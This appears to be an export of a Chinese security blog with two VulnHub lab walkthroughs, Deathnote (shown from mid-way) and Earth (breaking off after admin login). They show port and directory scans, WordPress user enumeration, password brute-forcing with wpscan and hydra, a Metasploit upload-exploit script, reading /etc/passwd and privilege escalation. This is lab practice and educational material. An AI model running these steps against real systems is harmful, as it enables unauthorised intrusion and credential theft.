<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -sV -A -p 1-65535 192.168.1.157</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">C:\root&gt; nmap -sV -A -p 1-65535 192.168.1.157</span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-11 13:29 EDT</span><br><span class="line">Nmap scan report for deathnote.vuln (192.168.1.157)</span><br><span class="line">Host is up (0.00092s latency).                                                                                                                                                                                     </span><br><span class="line">Not shown: 65533 closed ports                                                                               </span><br><span class="line">PORT   STATE SERVICE VERSION                                                                                                                                                                                       </span><br><span class="line">22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)                                                                                                                                                </span><br><span class="line">| ssh-hostkey:                                                                                                                                                                                                     </span><br><span class="line">|   2048 5e:b8:ff:2d:ac:c7:e9:3c:99:2f:3b:fc:da:5c:a3:53 (RSA)                                                                                                                                                     </span><br><span class="line">|   256 a8:f3:81:9d:0a:dc:16:9a:49:ee:bc:24:e4:65:5c:a6 (ECDSA)                                                                                                                                                    </span><br><span class="line">|_  256 4f:20:c3:2d:19:75:5b:e8:1f:32:01:75:c2:70:9a:7e (ED25519)                                                                                                                                                  </span><br><span class="line">80/tcp open  http    Apache httpd 2.4.38 ((Debian))                                                                                                                                                                </span><br><span class="line">|_http-server-header: Apache/2.4.38 (Debian)                                                                                                                                                                       </span><br><span class="line">|_http-title: Site doesn't have a title (text/html).                                                                                                                                                               </span><br><span class="line">MAC Address: 44:1C:A8:7F:6D:F4 (Hon Hai Precision Ind.)                                                                                                                                                            </span><br><span class="line">Device type: general purpose                                                                                                                                                                                       </span><br><span class="line">Running: Linux 5.X                                                                                                                                                                                                 </span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:5                                                                                                                                                                                </span><br><span class="line">OS details: Linux 5.0 - 5.4                                                                                                                                                                                        </span><br><span class="line">Network Distance: 1 hop                                                                                                                                                                                            </span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel                                                                                                                                                        </span><br><span class="line">TRACEROUTE                                                                                                                                                                                                         </span><br><span class="line">HOP RTT     ADDRESS                                                                                                                                                                                                </span><br><span class="line">1   0.92 ms deathnote.vuln (192.168.1.157)                                                                                                                                                                      </span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 15.44 seconds</span><br></pre></td></tr></table></figure>

<ul>
<li>目录扫描</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gobuster dir -u http://192.168.1.157/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,txt,php</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">C:\root&gt; gobuster dir -u http://192.168.1.157/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,txt,php</span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.1.0</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span><br><span class="line">===============================================================</span><br><span class="line">[+] Url:                     http://192.168.1.157/</span><br><span class="line">[+] Method:                  GET</span><br><span class="line">[+] Threads:                 10</span><br><span class="line">[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</span><br><span class="line">[+] Negative Status codes:   404</span><br><span class="line">[+] User Agent:              gobuster/3.1.0</span><br><span class="line">[+] Extensions:              txt,php,html</span><br><span class="line">[+] Timeout:                 10s</span><br><span class="line">===============================================================</span><br><span class="line">2021/09/11 13:29:59 Starting gobuster in directory enumeration mode</span><br><span class="line">===============================================================</span><br><span class="line">/index.html           (Status: 200) [Size: 197]</span><br><span class="line">/wordpress            (Status: 301) [Size: 318] [--&gt; http://192.168.1.157/wordpress/]</span><br><span class="line">/manual               (Status: 301) [Size: 315] [--&gt; http://192.168.1.157/manual/]   </span><br><span class="line">/robots.txt           (Status: 200) [Size: 68]                                       </span><br><span class="line">/server-status        (Status: 403) [Size: 278]                                      </span><br><span class="line">                                                                                     </span><br><span class="line">===============================================================</span><br><span class="line">2021/09/11 13:32:02 Finished</span><br><span class="line">===============================================================</span><br></pre></td></tr></table></figure>

<h3 id="登录web"><a href="#登录web" class="headerlink" title="登录web"></a>登录web</h3><ul>
<li>首页(配置<code>host 192.168.1.157 deathnote.vuln</code>) </li>
<li>发现<code>wordpress</code>框架</li>
</ul>
<p><img data-src="./Deathnote/1.png" alt></p>
<ul>
<li>信息收集一些信息，并没有什么大用</li>
</ul>
<p><img data-src="./Deathnote/2.png" alt></p>
<p><img data-src="./Deathnote/3.png" alt></p>
<p><img data-src="./Deathnote/4.png" alt></p>
<h3 id="cewl生成密码"><a href="#cewl生成密码" class="headerlink" title="cewl生成密码"></a>cewl生成密码</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cewl http://deathnote.vuln/wordpress/ -w pass_dict.txt -d 5 --with-numbers</span><br></pre></td></tr></table></figure>

<h3 id="wpscan"><a href="#wpscan" class="headerlink" title="wpscan"></a>wpscan</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">C:\root&gt; wpscan --url http://deathnote.vuln/wordpress/ --enumerate u                                                                                                                                           5 ⨯</span><br><span class="line">_______________________________________________________________</span><br><span class="line">         __          _______   _____</span><br><span class="line">         \ \        / /  __ \ / ____|</span><br><span class="line">          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®</span><br><span class="line">           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \</span><br><span class="line">            \  /\  /  | |     ____) | (__| (_| | | | |</span><br><span class="line">             \/  \/   |_|    |_____/ \___|\__,_|_| |_|</span><br><span class="line"></span><br><span class="line">         WordPress Security Scanner by the WPScan Team</span><br><span class="line">                         Version 3.8.18</span><br><span class="line">       Sponsored by Automattic - https://automattic.com/</span><br><span class="line">       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart</span><br><span class="line">_______________________________________________________________</span><br><span class="line"></span><br><span class="line">[+] URL: http://deathnote.vuln/wordpress/ [192.168.1.157]</span><br><span class="line">[+] Started: Sat Sep 11 13:41:09 2021</span><br><span class="line"></span><br><span class="line">Interesting Finding(s):</span><br><span class="line"></span><br><span class="line">[+] Headers</span><br><span class="line"> | Interesting Entry: Server: Apache/2.4.38 (Debian)</span><br><span class="line"> | Found By: Headers (Passive Detection)</span><br><span class="line"> | Confidence: 100%</span><br><span class="line"></span><br><span class="line">[+] XML-RPC seems to be enabled: http://deathnote.vuln/wordpress/xmlrpc.php</span><br><span class="line"> | Found By: Direct Access (Aggressive Detection)</span><br><span class="line"> | Confidence: 100%</span><br><span class="line"> | References:</span><br><span class="line"> |  - http://codex.wordpress.org/XML-RPC_Pingback_API</span><br><span class="line"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/</span><br><span class="line"> |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/</span><br><span class="line"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/</span><br><span class="line"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/</span><br><span class="line"></span><br><span class="line">[+] WordPress readme found: http://deathnote.vuln/wordpress/readme.html</span><br><span class="line"> | Found By: Direct Access (Aggressive Detection)</span><br><span class="line"> | Confidence: 100%</span><br><span class="line"></span><br><span class="line">[+] Upload directory has listing enabled: http://deathnote.vuln/wordpress/wp-content/uploads/</span><br><span class="line"> | Found By: Direct Access (Aggressive Detection)</span><br><span class="line"> | Confidence: 100%</span><br><span class="line"></span><br><span class="line">[+] The external WP-Cron seems to be enabled: http://deathnote.vuln/wordpress/wp-cron.php</span><br><span class="line"> | Found By: Direct Access (Aggressive Detection)</span><br><span class="line"> | Confidence: 60%</span><br><span class="line"> | References:</span><br><span class="line"> |  - https://www.iplocation.net/defend-wordpress-from-ddos</span><br><span class="line"> |  - https://github.com/wpscanteam/wpscan/issues/1299</span><br><span class="line"></span><br><span class="line">[+] WordPress version 5.8 identified (Insecure, released on 2021-07-20).</span><br><span class="line"> | Found By: Rss Generator (Passive Detection)</span><br><span class="line"> |  - http://deathnote.vuln/wordpress/index.php/feed/, &lt;generator&gt;https://wordpress.org/?v=5.8&lt;/generator&gt;</span><br><span class="line"> |  - http://deathnote.vuln/wordpress/index.php/comments/feed/, &lt;generator&gt;https://wordpress.org/?v=5.8&lt;/generator&gt;</span><br><span class="line"></span><br><span class="line">[+] WordPress theme in use: twentytwentyone</span><br><span class="line"> | Location: http://deathnote.vuln/wordpress/wp-content/themes/twentytwentyone/</span><br><span class="line"> | Last Updated: 2021-07-22T00:00:00.000Z</span><br><span class="line"> | Readme: http://deathnote.vuln/wordpress/wp-content/themes/twentytwentyone/readme.txt</span><br><span class="line"> | [!] The version is out of date, the latest version is 1.4</span><br><span class="line"> | Style URL: http://deathnote.vuln/wordpress/wp-content/themes/twentytwentyone/style.css?ver=1.3</span><br><span class="line"> | Style Name: Twenty Twenty-One</span><br><span class="line"> | Style URI: https://wordpress.org/themes/twentytwentyone/</span><br><span class="line"> | Description: Twenty Twenty-One is a blank canvas for your ideas and it makes the block editor your best brush. Wi...</span><br><span class="line"> | Author: the WordPress team</span><br><span class="line"> | Author URI: https://wordpress.org/</span><br><span class="line"> |</span><br><span class="line"> | Found By: Css Style In Homepage (Passive Detection)</span><br><span class="line"> |</span><br><span class="line"> | Version: 1.3 (80% confidence)</span><br><span class="line"> | Found By: Style (Passive Detection)</span><br><span class="line"> |  - http://deathnote.vuln/wordpress/wp-content/themes/twentytwentyone/style.css?ver=1.3, Match: 'Version: 1.3'</span><br><span class="line"></span><br><span class="line">[+] Enumerating Users (via Passive and Aggressive Methods)</span><br><span class="line"> Brute Forcing Author IDs - Time: 00:00:00 &lt;=====================================================================================================================================&gt; (10 / 10) 100.00% Time: 00:00:00</span><br><span class="line"></span><br><span class="line">[i] User(s) Identified:</span><br><span class="line"></span><br><span class="line">[+] kira</span><br><span class="line"> | Found By: Author Posts - Author Pattern (Passive Detection)</span><br><span class="line"> | Confirmed By:</span><br><span class="line"> |  Rss Generator (Passive Detection)</span><br><span class="line"> |  Wp Json Api (Aggressive Detection)</span><br><span class="line"> |   - http://deathnote.vuln/wordpress/index.php/wp-json/wp/v2/users/?per_page=100&amp;page=1</span><br><span class="line"> |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> |  Login Error Messages (Aggressive Detection)</span><br><span class="line"></span><br><span class="line">[!] No WPScan API Token given, as a result vulnerability data has not been output.</span><br><span class="line">[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register</span><br><span class="line"></span><br><span class="line">[+] Finished: Sat Sep 11 13:41:12 2021</span><br><span class="line">[+] Requests Done: 24</span><br><span class="line">[+] Cached Requests: 36</span><br><span class="line">[+] Data Sent: 6.956 KB</span><br><span class="line">[+] Data Received: 63.95 KB</span><br><span class="line">[+] Memory used: 161.27 MB</span><br><span class="line">[+] Elapsed time: 00:00:03</span><br></pre></td></tr></table></figure>

<ul>
<li>发现用户 <code>kira</code></li>
<li>暴力破解</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wpscan --url http://deathnote.vuln/wordpress/ -U kira -P ./pass_dict.txt</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line"></span><br><span class="line">[!] Valid Combinations Found:</span><br><span class="line"> | Username: kira, Password: iamjustic3</span><br></pre></td></tr></table></figure>

<h3 id="登录后台"><a href="#登录后台" class="headerlink" title="登录后台"></a>登录后台</h3><ul>
<li>发现<code>note.txt</code></li>
</ul>
<p><img data-src="./Deathnote/5.png" alt></p>
<h3 id="webshell"><a href="#webshell" class="headerlink" title="webshell"></a>webshell</h3><ul>
<li>下载有毒插件</li>
</ul>
<p><a href="https://www.exploit-db.com/exploits/36374" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/36374</a></p>
<p><img data-src="./Deathnote/6.png" alt></p>
<ul>
<li><p><a href="https://www.hackingarticles.in/wordpress-reverse-shell/" target="_blank" rel="noopener">https://www.hackingarticles.in/wordpress-reverse-shell/</a></p>
</li>
<li><p>攻击<code>rc</code>文件如下</p>
</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">msfconsole -r exp.rc</span><br><span class="line"></span><br><span class="line">use exploit/unix/webapp/wp_slideshowgallery_upload</span><br><span class="line">set rhosts 192.168.1.157</span><br><span class="line">set targeturi /wordpress</span><br><span class="line">set WP_PASSWORD iamjustic3</span><br><span class="line">set WP_USER kira</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>

<ul>
<li>这里失败了</li>
<li>但是插件处上传一个反弹shell成功(奇怪)</li>
</ul>
<p><img data-src="./Deathnote/7.png" alt></p>
<ul>
<li>拿到<code>shell</code></li>
</ul>
<p><img data-src="./Deathnote/8.png" alt></p>
<h3 id="提取-amp-amp-flag"><a href="#提取-amp-amp-flag" class="headerlink" title="提取&amp;&amp;flag"></a>提取&amp;&amp;flag</h3><ul>
<li>发现账户</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">www-data@deathnote:/var/backups$ cat /etc/passwd</span><br><span class="line">cat /etc/passwd</span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><br><span class="line">sys:x:3:3:sys:/dev:/usr/sbin/nologin</span><br><span class="line">sync:x:4:65534:sync:/bin:/bin/sync</span><br><span class="line">games:x:5:60:games:/usr/games:/usr/sbin/nologin</span><br><span class="line">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span><br><span class="line">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span><br><span class="line">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</span><br><span class="line">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</span><br><span class="line">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</span><br><span class="line">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</span><br><span class="line">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span><br><span class="line">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</span><br><span class="line">irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin</span><br><span class="line">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</span><br><span class="line">_apt:x:100:65534::/nonexistent:/usr/sbin/nologin</span><br><span class="line">systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin</span><br><span class="line">systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin</span><br><span class="line">systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin</span><br><span class="line">messagebus:x:104:110::/nonexistent:/usr/sbin/nologin</span><br><span class="line">avahi-autoipd:x:105:113:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin</span><br><span class="line">sshd:x:106:65534::/run/sshd:/usr/sbin/nologin</span><br><span class="line">l:x:1000:1000:L,,,:/home/l:/bin/bash</span><br><span class="line">systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin</span><br><span class="line">mysql:x:107:115:MySQL Server,,,:/nonexistent:/bin/false</span><br><span class="line">kira:x:1001:1001:kira,,,:/home/kira:/bin/bash</span><br></pre></td></tr></table></figure>

<ul>
<li>根据<code>note.txt</code>破解<code>l</code>密码</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">C:\root\vulnhub\Deathnote1&gt; hydra -l l -P .&#x2F;notes.txt 192.168.1.157 -t 4 ssh</span><br><span class="line">Hydra v9.1 (c) 2020 by van Hauser&#x2F;THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).</span><br><span class="line"></span><br><span class="line">Hydra (https:&#x2F;&#x2F;github.com&#x2F;vanhauser-thc&#x2F;thc-hydra) starting at 2021-09-12 12:35:16</span><br><span class="line">[DATA] max 4 tasks per 1 server, overall 4 tasks, 43 login tries (l:1&#x2F;p:43), ~11 tries per task</span><br><span class="line">[DATA] attacking ssh:&#x2F;&#x2F;192.168.1.157:22&#x2F;</span><br><span class="line">[22][ssh] host: 192.168.1.157   login: l   password: death4me</span><br><span class="line">[STATUS] 43.00 tries&#x2F;min, 43 tries in 00:01h, 1 to do in 00:01h, 3 active</span><br></pre></td></tr></table></figure>

<ul>
<li>获得一串密文, 一句废话</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;&gt;+++++.&lt;&lt;++.&gt;&gt;+++++++++++.------------.+.+++++.---.&lt;&lt;.&gt;&gt;++++++++++.&lt;&lt;.&gt;&gt;--------------.++++++++.+++++.&lt;&lt;.&gt;&gt;.------------.---.&lt;&lt;.&gt;&gt;++++++++++++++.-----------.---.+++++++..&lt;&lt;.++++++++++++.------------.&gt;&gt;----------.+++++++++++++++++++.-.&lt;&lt;.&gt;&gt;+++++.----------.++++++.&lt;&lt;.&gt;&gt;++.--------.-.++++++.&lt;&lt;.&gt;&gt;------------------.+++.&lt;&lt;.&gt;&gt;----.+.++++++++++.-------.&lt;&lt;.&gt;&gt;+++++++++++++++.-----.&lt;&lt;.&gt;&gt;----.--.+++..&lt;&lt;.&gt;&gt;+.--------.&lt;&lt;.+++++++++++++.&gt;&gt;++++++.--.+++++++++.-----------------.</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">i think u got the shell , but you wont be able to kill me -kira</span><br></pre></td></tr></table></figure>

<p><img data-src="./Deathnote/9.png" alt></p>
<ul>
<li><code>l</code>直接<code>ssh</code>登录<code>kira</code></li>
</ul>
<p><img data-src="./Deathnote/10.png" alt></p>
<p><img data-src="./Deathnote/11.png" alt></p>
<ul>
<li>解密得</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">please protect one of the following </span><br><span class="line">1. L (/opt)</span><br><span class="line">2. Misa (/var)</span><br></pre></td></tr></table></figure>

<p><img data-src="./Deathnote/12.png" alt></p>
<ul>
<li>继续解密</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">63 47 46 7a 63 33 64 6b 49 44 6f 67 61 32 6c 79 59 57 6c 7a 5a 58 5a 70 62 43 41 3d</span><br></pre></td></tr></table></figure>

<p><img data-src="./Deathnote/13.png" alt></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">passwd : kiraisevil</span><br></pre></td></tr></table></figure>

<p><img data-src="./Deathnote/14.png" alt></p>
<ul>
<li>最终提权成功</li>
</ul>
<p><img data-src="./Deathnote/15.png" alt></p>
]]></content>
      <categories>
        <category>靶场</category>
        <category>Deathnote</category>
      </categories>
      <tags>
        <tag>入门</tag>
        <tag>综合靶场测试</tag>
        <tag>Deathnote</tag>
      </tags>
  </entry>
  <entry>
    <title>Earth</title>
    <url>/2022/01/09/blog_formal/security/%E9%9D%B6%E5%9C%BA/web%E9%9D%B6%E5%9C%BA/finish/Earth/</url>
    <content><![CDATA[<h1 id="Earth"><a href="#Earth" class="headerlink" title="Earth"></a>Earth</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>​    一道boot2root的综合靶场练习</p>
<a id="more"></a>

<h2 id="基础环境"><a href="#基础环境" class="headerlink" title="基础环境"></a>基础环境</h2><ul>
<li>kali2020</li>
<li>Earth</li>
<li>windows10</li>
</ul>
<h2 id="测试步骤"><a href="#测试步骤" class="headerlink" title="测试步骤"></a>测试步骤</h2><h3 id="发现目标"><a href="#发现目标" class="headerlink" title="发现目标"></a>发现目标</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">arp-scan -l</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">C:\root\vulnhub\earth&gt; arp-scan -l</span><br><span class="line">Interface: eth0, type: EN10MB, MAC: 00:0c:29:47:5c:20, IPv4: 192.168.1.82</span><br><span class="line">Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)</span><br><span class="line">192.168.1.1     d8:c8:e9:fe:be:88       Phicomm (Shanghai) Co., Ltd.</span><br><span class="line">192.168.1.2     20:41:10:1a:04:8c       (Unknown)</span><br><span class="line">192.168.1.3     00:11:32:73:68:3b       Synology Incorporated</span><br><span class="line">192.168.1.4     00:0c:29:5a:87:06       VMware, Inc.</span><br><span class="line">192.168.1.5     00:0c:29:76:5e:9f       VMware, Inc.</span><br><span class="line">192.168.1.98    00:22:6d:62:86:81       Shenzhen GIEC Electronics Co., Ltd.</span><br><span class="line">192.168.1.109   40:31:3c:22:9c:f3       XIAOMI Electronics,CO.,LTD</span><br><span class="line">192.168.1.215   c0:e7:3e:b0:0b:5b       (Unknown)</span><br><span class="line">192.168.1.219   44:1c:a8:7f:6d:f4       Hon Hai Precision Ind. Co.,Ltd.</span><br><span class="line">192.168.1.228   44:1c:a8:7f:6d:f4       Hon Hai Precision Ind. Co.,Ltd.</span><br><span class="line">192.168.1.97    38:d2:ca:db:01:69       Zhejiang Tmall Technology Co., Ltd.</span><br><span class="line"></span><br><span class="line">11 packets received by filter, 0 packets dropped by kernel</span><br><span class="line">Ending arp-scan 1.9.7: 256 hosts scanned in 2.023 seconds (126.54 hosts/sec). 11 responded</span><br></pre></td></tr></table></figure>

<ul>
<li>目标为 <code>192.168.1.219</code></li>
<li><code>NMAP</code></li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -sV -A -p 1-65535 192.168.1.165</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">C:\root\vulnhub\earth&gt; nmap -sV -A -p 1-65535 192.168.1.219</span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-13 11:02 EST</span><br><span class="line">Stats: 0:01:41 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan</span><br><span class="line">SYN Stealth Scan Timing: About 64.20% done; ETC: 11:05 (0:00:57 remaining)</span><br><span class="line">Nmap scan report for earth.lan (192.168.1.219)</span><br><span class="line">Host is up (0.00088s latency).</span><br><span class="line">Not shown: 65532 filtered ports</span><br><span class="line">PORT    STATE SERVICE  VERSION</span><br><span class="line">22/tcp  open  ssh      OpenSSH 8.6 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   256 5b:2c:3f:dc:8b:76:e9:21:7b:d0:56:24:df:be:e9:a8 (ECDSA)</span><br><span class="line">|_  256 b0:3c:72:3b:72:21:26:ce:3a:84:e8:41:ec:c8:f8:41 (ED25519)</span><br><span class="line">80/tcp  open  http     Apache httpd 2.4.51 ((Fedora) OpenSSL/1.1.1l mod_wsgi/4.7.1 Python/3.9)</span><br><span class="line">|_http-server-header: Apache/2.4.51 (Fedora) OpenSSL/1.1.1l mod_wsgi/4.7.1 Python/3.9</span><br><span class="line">|_http-title: Bad Request (400)</span><br><span class="line">443/tcp open  ssl/http Apache httpd 2.4.51 ((Fedora) OpenSSL/1.1.1l mod_wsgi/4.7.1 Python/3.9)</span><br><span class="line">|_http-server-header: Apache/2.4.51 (Fedora) OpenSSL/1.1.1l mod_wsgi/4.7.1 Python/3.9</span><br><span class="line">|_http-title: Bad Request (400)</span><br><span class="line">| ssl-cert: Subject: commonName=earth.local/stateOrProvinceName=Space</span><br><span class="line">| Subject Alternative Name: DNS:earth.local, DNS:terratest.earth.local</span><br><span class="line">| Not valid before: 2021-10-12T23:26:31</span><br><span class="line">|_Not valid after:  2031-10-10T23:26:31</span><br><span class="line">| tls-alpn: </span><br><span class="line">|_  http/1.1</span><br><span class="line">MAC Address: 44:1C:A8:7F:6D:F4 (Hon Hai Precision Ind.)</span><br><span class="line">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Linux 4.X|5.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5</span><br><span class="line">OS details: Linux 4.15 - 5.6, Linux 5.0 - 5.4</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   0.88 ms earth.lan (192.168.1.219)</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 162.54 seconds</span><br></pre></td></tr></table></figure>

<ul>
<li>目录扫描</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gobuster dir -u http://192.168.1.219/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,txt,php</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">400 error</span><br><span class="line"></span><br><span class="line">gobuster dir -u http://earth.local/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,txt,php</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">C:\root\vulnhub\earth&gt; gobuster dir -u http://earth.local/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,txt,php</span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.1.0</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span><br><span class="line">===============================================================</span><br><span class="line">[+] Url:                     http://earth.local/</span><br><span class="line">[+] Method:                  GET</span><br><span class="line">[+] Threads:                 10</span><br><span class="line">[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</span><br><span class="line">[+] Negative Status codes:   404</span><br><span class="line">[+] User Agent:              gobuster/3.1.0</span><br><span class="line">[+] Extensions:              html,txt,php</span><br><span class="line">[+] Timeout:                 10s</span><br><span class="line">===============================================================</span><br><span class="line">2022/01/09 14:00:00 Starting gobuster in directory enumeration mode</span><br><span class="line">===============================================================</span><br><span class="line">/admin                (Status: 301) [Size: 0] [--&gt; /admin/]</span><br><span class="line">                                                           </span><br><span class="line">===============================================================</span><br><span class="line">2022/01/09 14:15:55 Finished</span><br><span class="line">===============================================================</span><br></pre></td></tr></table></figure>

<h3 id="登录web"><a href="#登录web" class="headerlink" title="登录web"></a>登录web</h3><ul>
<li>首页</li>
</ul>
<p><img data-src="./Earth/1.png" alt></p>
<p>配置host</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">192.168.1.165 earth.local terratest.earth.local</span><br></pre></td></tr></table></figure>

<p><img data-src="./Earth/2.png" alt></p>
<p>robost.txt文件内容</p>
<p><img data-src="./Earth/3.png" alt></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">User-Agent: *</span><br><span class="line">Disallow: &#x2F;*.asp</span><br><span class="line">Disallow: &#x2F;*.aspx</span><br><span class="line">Disallow: &#x2F;*.bat</span><br><span class="line">Disallow: &#x2F;*.c</span><br><span class="line">Disallow: &#x2F;*.cfm</span><br><span class="line">Disallow: &#x2F;*.cgi</span><br><span class="line">Disallow: &#x2F;*.com</span><br><span class="line">Disallow: &#x2F;*.dll</span><br><span class="line">Disallow: &#x2F;*.exe</span><br><span class="line">Disallow: &#x2F;*.htm</span><br><span class="line">Disallow: &#x2F;*.html</span><br><span class="line">Disallow: &#x2F;*.inc</span><br><span class="line">Disallow: &#x2F;*.jhtml</span><br><span class="line">Disallow: &#x2F;*.jsa</span><br><span class="line">Disallow: &#x2F;*.json</span><br><span class="line">Disallow: &#x2F;*.jsp</span><br><span class="line">Disallow: &#x2F;*.log</span><br><span class="line">Disallow: &#x2F;*.mdb</span><br><span class="line">Disallow: &#x2F;*.nsf</span><br><span class="line">Disallow: &#x2F;*.php</span><br><span class="line">Disallow: &#x2F;*.phtml</span><br><span class="line">Disallow: &#x2F;*.pl</span><br><span class="line">Disallow: &#x2F;*.reg</span><br><span class="line">Disallow: &#x2F;*.sh</span><br><span class="line">Disallow: &#x2F;*.shtml</span><br><span class="line">Disallow: &#x2F;*.sql</span><br><span class="line">Disallow: &#x2F;*.txt</span><br><span class="line">Disallow: &#x2F;*.xml</span><br><span class="line">Disallow: &#x2F;testingnotes.*</span><br></pre></td></tr></table></figure>

<p><img data-src="./Earth/4.png" alt></p>
<p><img data-src="./Earth/5.png" alt></p>
<h3 id="解密得到后台密码"><a href="#解密得到后台密码" class="headerlink" title="解密得到后台密码"></a>解密得到后台密码</h3><p><img data-src="./Earth/6.png" alt></p>
<p>得到账号密码</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">terra / earthclimatechangebad4humans</span><br></pre></td></tr></table></figure>

<ul>
<li>登录后台</li>
</ul>
<p><img data-src="./Earth/7.png" alt></p>
<p><img data-src="./Earth/8.png" alt></p>
<p><img data-src="./Earth/9.png" alt></p>
